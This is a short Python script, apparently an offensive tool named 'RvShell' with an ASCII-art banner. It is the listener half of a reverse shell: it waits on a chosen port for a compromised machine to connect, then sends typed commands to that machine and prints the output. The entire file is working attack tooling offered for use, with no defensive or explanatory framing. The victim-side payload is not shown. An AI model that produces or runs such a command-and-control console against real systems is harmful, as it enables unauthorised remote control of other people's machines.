import socket
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

os.system('cls' if os.name == 'nt' else 'clear')
print(r"""
  _____         _____ _          _ _ 
 |  __ \       / ____| |        | | |
 | |__) |_   _| (___ | |__   ___| | |
 |  _  /\ \ / /\___ \| '_ \ / _ \ | |
 | | \ \ \ V / ____) | | | |  __/ | |
 |_|  \_\ \_/ |_____/|_| |_|\___|_|_|""")
print("""---------------------------------------
        S4m-Sepi0l - RvShell\n""")
try:
   port = int(input('Enter port to listen on: '))
except KeyboardInterrupt:
   print('\n[-] interrupted by user')
   exit()
except ValueError:
   print('[-] invalid port number')
   exit()

try:
   s.bind(('0.0.0.0', port))
   s.listen(1)
   print('[!] waiting for incoming connection...')
   c, addr = s.accept()
   print(f'[+] connection from {addr[0]}:{addr[1]}')
   c.settimeout(1.0)

   print('sh@shell:~$ ', end='')
   while True:
      try:
        input_cmd = input().strip()

        if not input_cmd:
            print('sh@shell:~$ ', end='')
            continue

        if input_cmd.lower() == 'clear':
           os.system('cls' if os.name == 'nt' else 'clear')
           print('sh@shell:~$ ', end='')
        elif input_cmd.lower() in ('exit', 'quit'):
            c.send(input_cmd.encode())
            print('[+] closing connection')
            break
        else:
            c.send(input_cmd.encode())
            try:
                result = c.recv(8192).decode('utf-8', errors='ignore')
                if result:
                    print(result, end='')
            except socket.timeout:
                pass
            print('sh@shell:~$ ', end='')
      except KeyboardInterrupt:
         print('\n[-] interrupted by user')
         exit()

except KeyboardInterrupt:
   print('\n[-] interrupted by user')
